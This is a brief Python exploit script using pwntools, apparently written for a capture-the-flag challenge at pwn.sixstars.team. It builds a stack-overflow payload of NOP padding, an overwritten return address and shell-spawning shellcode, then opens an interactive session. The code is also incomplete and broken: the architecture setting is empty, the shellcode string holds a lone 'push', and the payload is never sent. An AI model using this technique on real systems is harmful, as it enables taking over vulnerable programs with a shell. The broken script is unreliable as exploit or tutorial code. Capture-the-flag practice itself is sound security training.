from pwn import *
context.log_level="debug"
context.arch = ""
context.os = "linux"
r=remote("pwn.sixstars.team", 22002)
r.recv()

shellcode = """

push 



"""



payload = '\x90'*0x28 + p32(0x08041111) + asm(shellcraft.sh())

r.interactive()
